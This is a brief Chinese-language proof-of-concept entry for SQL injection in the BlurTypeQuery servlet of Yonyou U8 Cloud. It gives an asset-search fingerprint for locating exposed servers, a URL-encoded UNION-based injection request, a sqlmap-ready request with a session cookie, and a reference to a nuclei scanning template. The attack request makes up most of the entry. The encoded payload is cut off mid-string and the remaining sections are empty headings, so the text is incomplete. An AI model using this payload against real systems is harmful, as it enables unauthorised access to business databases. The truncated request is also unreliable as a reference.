# 用友U8CloudBlurTypeQuery存在SQL注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`GET /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28112`
- **关键头**：`Host: {hostname}`　`Cookie: JSESSIONID=42951667C70BD37103E4A706BB56ED41.server`

**请求体 / payload**
```

sqlmap
GET /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1 HTTP/1.1
Host: {hostname}
Cookie: JSESSIONID=42951667C70BD37103E4A706BB56ED41.server

nuclei脚本\
\[用友-U8C-Cloud-BlurTypeQuery-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 用友U8 Cloud BlurTypeQuery 存在SQL注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud